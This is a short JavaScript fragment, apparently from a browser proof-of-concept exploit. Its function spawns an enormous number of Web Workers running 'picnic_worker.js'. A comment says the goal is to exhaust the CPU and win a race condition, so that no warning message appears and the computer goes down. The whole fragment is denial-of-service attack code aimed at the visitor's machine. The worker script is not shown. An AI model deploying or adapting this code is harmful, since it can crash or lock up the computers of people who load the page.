  
function gopicnic()
{
    // Let's dos the cpu and try to win a race condition -> if we win, no warning message will be shown, and then the computer is go down.
    for(var i = 0; i < 0x7ffff000;i++) {
	    var worker = new Worker('picnic_worker.js');
	    worker.postMessage('as'); 
    }
}
